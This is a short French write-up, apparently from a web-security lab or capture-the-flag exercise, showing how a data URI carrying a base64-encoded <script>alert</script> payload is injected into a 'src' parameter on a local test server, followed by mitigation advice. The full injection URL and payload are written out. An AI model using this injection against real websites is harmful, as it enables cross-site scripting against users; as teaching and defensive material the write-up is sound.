
# Exploitation de Data URI pour l'inclusion de script malveillant

## Description de l'attaque

Lorsqu'une page web utilise un paramètre comme `src` pour charger une ressource (exemple : une image ou un fichier), il est possible d'exploiter cela pour injecter un script malveillant si les entrées ne sont pas correctement validées.

Dans cet exemple, l'URL est :
```
http://192.168.1.32/index.php?page=media&src=nsa
```

Le paramètre `src` est utilisé pour indiquer quelle ressource charger. Si ce paramètre accepte des URI, un attaquant peut injecter une `data URI` contenant un script malveillant.

---

## Fonctionnement d'une Data URI

Une `data URI` permet d'inclure directement des données ou des ressources dans une URL. La syntaxe est la suivante :
```
data:[<MIME type>][;base64],<data>
```

- **MIME type** : Type de contenu à charger (exemple : `text/html` pour du code HTML).
- **Base64** : (Optionnel) Les données peuvent être encodées en base64.
- **Data** : Les données réelles (par exemple, un script).

### Exemple d'injection de script

1. Le script malveillant :
    ```html
    <script>alert('toto')</script>
    ```

2. Encodage en base64 :
    ```
    PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
    ```

3. Construction de la Data URI :
    ```
    data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
    ```

4. Remplacement dans l'URL :
    ```
    http://192.168.1.32/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
    ```

En chargeant cette URL, le script est exécuté sur la page.

---

## Comment éviter cette vulnérabilité ?

1. **Validation stricte des entrées utilisateur** :
   - Autoriser uniquement des valeurs spécifiques dans les paramètres (`nsa`, `image1.jpg`, etc.).
   - Bloquer toute URI commençant par `data:`.

2. **Utiliser une base de données** :
   - Stocker les ressources dans une base de données et utiliser des identifiants pour les charger. Exemple :
     ```
     src=12345
     ```

3. **Sanitisation des données** :
   - Nettoyer toutes les entrées utilisateur avant de les utiliser.

---

## Conclusion

Cette attaque montre l'importance de valider et de restreindre les entrées utilisateur dans une application web. Une bonne pratique est d'utiliser des mécanismes sécurisés pour charger les ressources, comme une base de données, et d'éviter toute manipulation directe des URI.
